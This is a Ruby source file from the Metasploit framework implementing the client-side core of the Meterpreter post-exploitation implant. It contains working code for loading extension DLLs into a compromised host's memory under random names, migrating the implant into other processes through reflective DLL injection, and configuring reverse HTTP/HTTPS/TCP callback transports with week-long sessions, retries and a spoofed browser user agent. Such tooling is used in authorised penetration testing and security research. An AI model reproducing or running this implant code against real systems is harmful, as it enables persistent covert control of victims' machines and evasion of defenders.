# -*- coding: binary -*-

require 'rex/post/meterpreter/packet'
require 'rex/post/meterpreter/extension'
require 'rex/post/meterpreter/client'

# Used to generate a reflective DLL when migrating. This is yet another
# argument for moving the meterpreter client into the Msf namespace.
require 'msf/core/payload/windows'
require 'msf/core/payload/windows/migrate'
require 'msf/core/payload/windows/x64/migrate'

# URI uuid and checksum stuff
require 'msf/core/payload/uuid'
require 'rex/payloads/meterpreter/uri_checksum'

# certificate hash checking
require 'rex/socket/x509_certificate'

module Rex
module Post
module Meterpreter

###
#
# This class is responsible for providing the interface to the core
# client-side meterpreter API which facilitates the loading of extensions
# and the interaction with channels.
#
#
###
class ClientCore < Extension

  UNIX_PATH_MAX = 108
  DEFAULT_SOCK_PATH = "/tmp/meterpreter.sock"

  METERPRETER_TRANSPORT_SSL   = 0
  METERPRETER_TRANSPORT_HTTP  = 1
  METERPRETER_TRANSPORT_HTTPS = 2

  TIMEOUT_SESSION = 24*3600*7  # 1 week
  TIMEOUT_COMMS = 300          # 5 minutes
  TIMEOUT_RETRY_TOTAL = 60*60  # 1 hour
  TIMEOUT_RETRY_WAIT = 10      # 10 seconds

  VALID_TRANSPORTS = {
    'reverse_tcp'   => METERPRETER_TRANSPORT_SSL,
    'reverse_http'  => METERPRETER_TRANSPORT_HTTP,
    'reverse_https' => METERPRETER_TRANSPORT_HTTPS,
    'bind_tcp'      => METERPRETER_TRANSPORT_SSL
  }

  include Rex::Payloads::Meterpreter::UriChecksum

  #
  # Initializes the 'core' portion of the meterpreter client commands.
  #
  def initialize(client)
    super(client, 'core')
  end

  ##
  #
  # Core commands
  #
  ##

  #
  # Get a list of loaded commands for the given extension.
  #
  def get_loaded_extension_commands(extension_name)
    request = Packet.create_request('core_enumextcmd')
    request.add_tlv(TLV_TYPE_STRING, extension_name)

    begin
      response = self.client.send_packet_wait_response(request, self.client.response_timeout)
    rescue
      # In the case where orphaned shells call back with OLD copies of the meterpreter
      # binaries, we end up with a case where this fails. So here we just return the
      # empty list of supported commands.
      return []
    end

    # No response?
    if response.nil?
      raise RuntimeError, 'No response was received to the core_enumextcmd request.', caller
    elsif response.result != 0
      # This case happens when the target doesn't support the core_enumextcmd message.
      # If this is the case, then we just want to ignore the error and return an empty
      # list. This will force the caller to load any required modules.
      return []
    end

    commands = []
    response.each(TLV_TYPE_STRING) { |c|
      commands << c.value
    }

    commands
  end

  def transport_list
    request = Packet.create_request('core_transport_list')
    response = client.send_request(request)

    result = {
      :session_exp => response.get_tlv_value(TLV_TYPE_TRANS_SESSION_EXP),
      :transports  => []
    }

    response.each(TLV_TYPE_TRANS_GROUP) { |t|
      result[:transports] << {
        :url          => t.get_tlv_value(TLV_TYPE_TRANS_URL),
        :comm_timeout => t.get_tlv_value(TLV_TYPE_TRANS_COMM_TIMEOUT),
        :retry_total  => t.get_tlv_value(TLV_TYPE_TRANS_RETRY_TOTAL),
        :retry_wait   => t.get_tlv_value(TLV_TYPE_TRANS_RETRY_WAIT),
        :ua           => t.get_tlv_value(TLV_TYPE_TRANS_UA),
        :proxy_host   => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_HOST),
        :proxy_user   => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_USER),
        :proxy_pass   => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_PASS),
        :cert_hash    => t.get_tlv_value(TLV_TYPE_TRANS_CERT_HASH)
      }
    }

    result
  end

  def set_transport_timeouts(opts={})
    request = Packet.create_request('core_transport_set_timeouts')

    if opts[:session_exp]
      request.add_tlv(TLV_TYPE_TRANS_SESSION_EXP, opts[:session_exp])
    end
    if opts[:comm_timeout]
      request.add_tlv(TLV_TYPE_TRANS_COMM_TIMEOUT, opts[:comm_timeout])
    end
    if opts[:retry_total]
      request.add_tlv(TLV_TYPE_TRANS_RETRY_TOTAL, opts[:retry_total])
    end
    if opts[:retry_wait]
      request.add_tlv(TLV_TYPE_TRANS_RETRY_WAIT, opts[:retry_wait])
    end

    response = client.send_request(request)

    {
      :session_exp  => response.get_tlv_value(TLV_TYPE_TRANS_SESSION_EXP),
      :comm_timeout => response.get_tlv_value(TLV_TYPE_TRANS_COMM_TIMEOUT),
      :retry_total  => response.get_tlv_value(TLV_TYPE_TRANS_RETRY_TOTAL),
      :retry_wait   => response.get_tlv_value(TLV_TYPE_TRANS_RETRY_WAIT)
    }
  end

  #
  # Loads a library on the remote meterpreter instance.  This method
  # supports loading both extension and non-extension libraries and
  # also supports loading libraries from memory or disk depending
  # on the flags that are specified
  #
  # Supported flags:
  #
  #	LibraryFilePath
  #		The path to the library that is to be loaded
  #
  #	TargetFilePath
  #		The target library path when uploading
  #
  #	UploadLibrary
  #		Indicates whether or not the library should be uploaded
  #
  #	SaveToDisk
  #		Indicates whether or not the library should be saved to disk
  #		on the remote machine
  #
  #	Extension
  #		Indicates whether or not the library is a meterpreter extension
  #
  def load_library(opts)
    library_path = opts['LibraryFilePath']
    target_path  = opts['TargetFilePath']
    load_flags   = LOAD_LIBRARY_FLAG_LOCAL

    # No library path, no cookie.
    if library_path.nil?
      raise ArgumentError, 'No library file path was supplied', caller
    end

    # Set up the proper loading flags
    if opts['UploadLibrary']
      load_flags &= ~LOAD_LIBRARY_FLAG_LOCAL
    end
    if opts['SaveToDisk']
      load_flags |= LOAD_LIBRARY_FLAG_ON_DISK
    end
    if opts['Extension']
      load_flags |= LOAD_LIBRARY_FLAG_EXTENSION
    end

    # Create a request packet
    request = Packet.create_request('core_loadlib')

    # If we must upload the library, do so now
    if (load_flags & LOAD_LIBRARY_FLAG_LOCAL) != LOAD_LIBRARY_FLAG_LOCAL
      image = ''

      ::File.open(library_path, 'rb') { |f|
        image = f.read
      }

      if !image.nil?
        request.add_tlv(TLV_TYPE_DATA, image, false, client.capabilities[:zlib])
      else
        raise RuntimeError, "Failed to serialize library #{library_path}.", caller
      end

      # If it's an extension we're dealing with, rename the library
      # path of the local and target so that it gets loaded with a random
      # name
      if opts['Extension']
        library_path = "ext#{rand(1000000)}.#{client.binary_suffix}"
        target_path  = library_path
      end
    end

    # Add the base TLVs
    request.add_tlv(TLV_TYPE_LIBRARY_PATH, library_path)
    request.add_tlv(TLV_TYPE_FLAGS, load_flags)

    if !target_path.nil?
      request.add_tlv(TLV_TYPE_TARGET_PATH, target_path)
    end

    # Transmit the request and wait the default timeout seconds for a response
    response = self.client.send_packet_wait_response(request, self.client.response_timeout)

    # No response?
    if response.nil?
      raise RuntimeError, 'No response was received to the core_loadlib request.', caller
    elsif response.result != 0
      raise RuntimeError, "The core_loadlib request failed with result: #{response.result}.", caller
    end

    commands = []
    response.each(TLV_TYPE_METHOD) { |c|
      commands << c.value
    }

    return commands
  end

  #
  # Loads a meterpreter extension on the remote server instance and
  # initializes the client-side extension handlers
  #
  #	Module
  #		The module that should be loaded
  #
  #	LoadFromDisk
  #		Indicates that the library should be loaded from disk, not from
  #		memory on the remote machine
  #
  def use(mod, opts = { })
    if mod.nil?
      raise RuntimeError, "No modules were specified", caller
    end

    # Query the remote instance to see if commands for the extension are
    # already loaded
    commands = get_loaded_extension_commands(mod.downcase)

    # if there are existing commands for the given extension, then we can use
    # what's already there
    unless commands.length > 0
      # Get us to the installation root and then into data/meterpreter, where
      # the file is expected to be
      modname = "ext_server_#{mod.downcase}"
      path = MetasploitPayloads.meterpreter_path(modname, client.binary_suffix)

      if opts['ExtensionPath']
        path = ::File.expand_path(opts['ExtensionPath'])
      end

      if path.nil?
        raise RuntimeError, "No module of the name #{modname}.#{client.binary_suffix} found", caller
      end

      # Load the extension DLL
      commands = load_library(
          'LibraryFilePath' => path,
          'UploadLibrary'   => true,
          'Extension'       => true,
          'SaveToDisk'      => opts['LoadFromDisk'])
    end

    # wire the commands into the client
    client.add_extension(mod, commands)

    return true
  end

  def set_uuid(uuid)
    request = Packet.create_request('core_set_uuid')
    request.add_tlv(TLV_TYPE_UUID, uuid.to_raw)

    client.send_request(request)

    true
  end

  def machine_id(timeout=nil)
    request = Packet.create_request('core_machine_id')

    args = [ request ]
    args << timeout if timeout

    response = client.send_request(*args)

    mid = response.get_tlv_value(TLV_TYPE_MACHINE_ID)

    # Normalise the format of the incoming machine id so that it's consistent
    # regardless of case and leading/trailing spaces. This means that the
    # individual meterpreters don't have to care.

    # Note that the machine ID may be blank or nil and that is OK
    Rex::Text.md5(mid.to_s.downcase.strip)
  end

  def native_arch(timeout=nil)
    # Not all meterpreter implementations support this
    request = Packet.create_request('core_native_arch')

    args = [ request ]
    args << timeout if timeout

    response = client.send_request(*args)

    response.get_tlv_value(TLV_TYPE_STRING)
  end

  def transport_remove(opts={})
    request = transport_prepare_request('core_transport_remove', opts)

    return false unless request

    client.send_request(request)

    return true
  end

  def transport_add(opts={})
    request = transport_prepare_request('core_transport_add', opts)

    return false unless request

    client.send_request(request)

    return true
  end

  def transport_change(opts={})
    request = transport_prepare_request('core_transport_change', opts)

    return false unless request

    client.send_request(request)

    return true
  end

  def transport_sleep(seconds)
    return false if seconds == 0

    request = Packet.create_request('core_transport_sleep')

    # we're reusing the comms timeout setting here instead of
    # creating a whole new TLV value
    request.add_tlv(TLV_TYPE_TRANS_COMM_TIMEOUT, seconds)
    client.send_request(request)
    return true
  end

  def transport_next
    request = Packet.create_request('core_transport_next')
    client.send_request(request)
    return true
  end

  def transport_prev
    request = Packet.create_request('core_transport_prev')
    client.send_request(request)
    return true
  end

  #
  # Enable the SSL certificate has verificate
  #
  def enable_ssl_hash_verify
    # Not supported unless we have a socket with SSL enabled
    return nil unless self.client.sock.type? == 'tcp-ssl'

    request = Packet.create_request('core_transport_setcerthash')

    hash = Rex::Text.sha1_raw(self.client.sock.sslctx.cert.to_der)
    request.add_tlv(TLV_TYPE_TRANS_CERT_HASH, hash)

    client.send_request(request)

    return hash
  end

  #
  # Disable the SSL certificate has verificate
  #
  def disable_ssl_hash_verify
    # Not supported unless we have a socket with SSL enabled
    return nil unless self.client.sock.type? == 'tcp-ssl'

    request = Packet.create_request('core_transport_setcerthash')

    # send an empty request to disable it
    client.send_request(request)

    return true
  end

  #
  # Attempt to get the SSL hash being used for verificaton (if any).
  #
  # @return 20-byte sha1 hash currently being used for verification.
  #
  def get_ssl_hash_verify
    # Not supported unless we have a socket with SSL enabled
    return nil unless self.client.sock.type? == 'tcp-ssl'

    request = Packet.create_request('core_transport_getcerthash')
    response = client.send_request(request)

    return response.get_tlv_value(TLV_TYPE_TRANS_CERT_HASH)
  end

  #
  # Migrates the meterpreter instance to the process specified
  # by pid.  The connection to the server remains established.
  #
  def migrate(target_pid, writable_dir = nil, opts = {})
    keepalive              = client.send_keepalives
    client.send_keepalives = false
    target_process         = nil
    current_process        = nil

    # Load in the stdapi extension if not allready present so we can determine the target pid architecture...
    client.core.use('stdapi') if not client.ext.aliases.include?('stdapi')

    current_pid = client.sys.process.getpid

    # Find the current and target process instances
    client.sys.process.processes.each { | p |
      if p['pid'] == target_pid
        target_process = p
      elsif p['pid'] == current_pid
        current_process = p
      end
    }

    # We cant migrate into a process that does not exist.
    unless target_process
      raise RuntimeError, 'Cannot migrate into non existent process', caller
    end

    # We cannot migrate into a process that we are unable to open
    # On linux, arch is empty even if we can access the process
    if client.platform == 'windows'
      if target_process['arch'] == nil || target_process['arch'].empty?
        raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
      end
    end

    # And we also cannot migrate into our own current process...
    if current_process['pid'] == target_process['pid']
      raise RuntimeError, 'Cannot migrate into current process', caller
    end

    if client.platform == 'linux'
      if writable_dir.to_s.strip.empty?
        writable_dir = tmp_folder
      end

      stat_dir = client.fs.filestat.new(writable_dir)

      unless stat_dir.directory?
        raise RuntimeError, "Directory #{writable_dir} not found", caller
      end
      # Rex::Post::FileStat#writable? isn't available
    end

    migrate_stub = generate_migrate_stub(target_process)
    migrate_payload = generate_migrate_payload(target_process)

    # Build the migration request
    request = Packet.create_request('core_migrate')

    if client.platform == 'linux'
      socket_path = File.join(writable_dir, Rex::Text.rand_text_alpha_lower(5 + rand(5)))

      if socket_path.length > UNIX_PATH_MAX - 1
        raise RuntimeError, 'The writable dir is too long', caller
      end

      pos = migrate_payload.index(DEFAULT_SOCK_PATH)

      if pos.nil?
        raise RuntimeError, 'The meterpreter binary is wrong', caller
      end

      migrate_payload[pos, socket_path.length + 1] = socket_path + "\x00"

      ep = elf_ep(migrate_payload)
      request.add_tlv(TLV_TYPE_MIGRATE_BASE_ADDR, 0x20040000)
      request.add_tlv(TLV_TYPE_MIGRATE_ENTRY_POINT, ep)
      request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
    end

    request.add_tlv( TLV_TYPE_MIGRATE_PID, target_pid )
    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length )
    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
    request.add_tlv( TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length )
    request.add_tlv( TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])

    if target_process['arch'] == ARCH_X64
      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64

    else
      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
    end

    # if we change architecture, we need to change UUID as well
    if current_process['arch'] != target_process['arch']
      client.payload_uuid.arch = target_process['arch']
      request.add_tlv( TLV_TYPE_UUID, client.payload_uuid.to_raw )
    end

    # Send the migration request. Timeout can be specified by the caller, or set to a min
    # of 60 seconds.
    timeout = [(opts[:timeout] || 0), 60].max
    client.send_request(request, timeout)

    if client.passive_service
      # Sleep for 5 seconds to allow the full handoff, this prevents
      # the original process from stealing our loadlib requests
      ::IO.select(nil, nil, nil, 5.0)
    else
      # Prevent new commands from being sent while we finish migrating
      client.comm_mutex.synchronize do
        # Disable the socket request monitor
        client.monitor_stop

        ###
        # Now communicating with the new process
        ###

        # If renegotiation takes longer than a minute, it's a pretty
        # good bet that migration failed and the remote side is hung.
        # Since we have the comm_mutex here, we *must* release it to
        # keep from hanging the packet dispatcher thread, which results
        # in blocking the entire process.
        begin
          Timeout.timeout(timeout) do
            # Renegotiate SSL over this socket
            client.swap_sock_ssl_to_plain()
            client.swap_sock_plain_to_ssl()
          end
        rescue TimeoutError
          client.alive = false
          return false
        end

        # Restart the socket monitor
        client.monitor_socket

      end
    end

    # Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
    client.ext.aliases.keys.each { |e|
      client.core.use(e)
    }

    # Restore session keep-alives
    client.send_keepalives = keepalive

    return true
  end

  #
  # Shuts the session down
  #
  def shutdown
    request  = Packet.create_request('core_shutdown')

    if client.passive_service
      # If this is a HTTP/HTTPS session we need to wait a few seconds
      # otherwise the session may not receive the command before we
      # kill the handler. This could be improved by the server side
      # sending a reply to shutdown first.
      self.client.send_packet_wait_response(request, 10)
    else
      # If this is a standard TCP session, send and forget.
      self.client.send_packet(request)
    end
    true
  end

  #
  # Indicates if the given transport is a valid transport option.
  #
  def valid_transport?(transport)
    if transport
      VALID_TRANSPORTS.has_key?(transport.downcase)
    else
      false
    end
  end

private

  def get_current_transport
    transport_list[:transports][0]
  end

  def generate_migrate_stub(target_process)
    stub = nil

    if client.platform == 'windows' && [ARCH_X86, ARCH_X64].include?(client.arch)
      t = get_current_transport

      c = Class.new(::Msf::Payload)

      if target_process['arch'] == ARCH_X86
        c.include(::Msf::Payload::Windows::BlockApi)
        case t[:url]
        when /^tcp/i
          c.include(::Msf::Payload::Windows::MigrateTcp)
        when /^http/i
          # Covers HTTP and HTTPS
          c.include(::Msf::Payload::Windows::MigrateHttp)
        end
      else
        c.include(::Msf::Payload::Windows::BlockApi_x64)
        case t[:url]
        when /^tcp/i
          c.include(::Msf::Payload::Windows::MigrateTcp_x64)
        when /^http/i
          # Covers HTTP and HTTPS
          c.include(::Msf::Payload::Windows::MigrateHttp_x64)
        end
      end

      stub = c.new().generate
    else
      raise RuntimeError, "Unsupported session #{client.session_type}"
    end

    stub
  end

  def transport_prepare_request(method, opts={})
    unless valid_transport?(opts[:transport]) && opts[:lport]
      return nil
    end

    if opts[:transport].starts_with?('reverse')
      return false unless opts[:lhost]
    else
      # Bind shouldn't have lhost set
      opts[:lhost] = nil
    end

    transport = VALID_TRANSPORTS[opts[:transport]]

    request = Packet.create_request(method)

    scheme = opts[:transport].split('_')[1]
    url = "#{scheme}://#{opts[:lhost]}:#{opts[:lport]}"

    if opts[:luri] && opts[:luri].length > 0
      if opts[:luri][0] != '/'
        url << '/'
      end
      url << opts[:luri]
      if url[-1] == '/'
        url = url[0...-1]
      end
    end

    if opts[:comm_timeout]
      request.add_tlv(TLV_TYPE_TRANS_COMM_TIMEOUT, opts[:comm_timeout])
    end

    if opts[:session_exp]
      request.add_tlv(TLV_TYPE_TRANS_SESSION_EXP, opts[:session_exp])
    end

    if opts[:retry_total]
      request.add_tlv(TLV_TYPE_TRANS_RETRY_TOTAL, opts[:retry_total])
    end

    if opts[:retry_wait]
      request.add_tlv(TLV_TYPE_TRANS_RETRY_WAIT, opts[:retry_wait])
    end

    # do more magic work for http(s) payloads
    unless opts[:transport].ends_with?('tcp')
      if opts[:uri]
        url << '/' unless opts[:uri].start_with?('/')
        url << opts[:uri]
        url << '/' unless opts[:uri].end_with?('/')
      else
        sum = uri_checksum_lookup(:connect)
        url << generate_uri_uuid(sum, opts[:uuid]) + '/'
      end

      # TODO: randomise if not specified?
      opts[:ua] ||= 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'
      request.add_tlv(TLV_TYPE_TRANS_UA, opts[:ua])

      if transport == METERPRETER_TRANSPORT_HTTPS && opts[:cert]
        hash = Rex::Socket::X509Certificate.get_cert_file_hash(opts[:cert])
        request.add_tlv(TLV_TYPE_TRANS_CERT_HASH, hash)
      end

      if opts[:proxy_host] && opts[:proxy_port]
        prefix = 'http://'
        prefix = 'socks=' if opts[:proxy_type].to_s.downcase == 'socks'
        proxy = "#{prefix}#{opts[:proxy_host]}:#{opts[:proxy_port]}"
        request.add_tlv(TLV_TYPE_TRANS_PROXY_HOST, proxy)

        if opts[:proxy_user]
          request.add_tlv(TLV_TYPE_TRANS_PROXY_USER, opts[:proxy_user])
        end
        if opts[:proxy_pass]
          request.add_tlv(TLV_TYPE_TRANS_PROXY_PASS, opts[:proxy_pass])
        end
      end

    end

    request.add_tlv(TLV_TYPE_TRANS_TYPE, transport)
    request.add_tlv(TLV_TYPE_TRANS_URL, url)

    return request
  end


  def generate_migrate_payload(target_process)
    case client.platform
    when 'windows'
      blob = generate_migrate_windows_payload(target_process)
    when 'linux'
      blob = generate_migrate_linux_payload
    else
      raise RuntimeError, "Unsupported platform '#{client.platform}'"
    end

    blob
  end

  def generate_migrate_windows_payload(target_process)
    c = Class.new( ::Msf::Payload )
    c.include( ::Msf::Payload::Stager )

    # Include the appropriate reflective dll injection module for the target process architecture...
    if target_process['arch'] == ARCH_X86
      c.include( ::Msf::Payload::Windows::MeterpreterLoader )
    elsif target_process['arch'] == ARCH_X64
      c.include( ::Msf::Payload::Windows::MeterpreterLoader_x64 )
    else
      raise RuntimeError, "Unsupported target architecture '#{target_process['arch']}' for process '#{target_process['name']}'.", caller
    end

    # Create the migrate stager
    migrate_stager = c.new()

    migrate_stager.stage_meterpreter
  end

  def generate_migrate_linux_payload
    MetasploitPayloads.read('meterpreter', 'msflinker_linux_x86.bin')
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
    ep = elf.elf_header.e_entry
    return ep
  end

  def tmp_folder
    tmp = client.sys.config.getenv('TMPDIR')

    if tmp.to_s.strip.empty?
      tmp = '/tmp'
    end

    tmp
  end

end

end; end; end

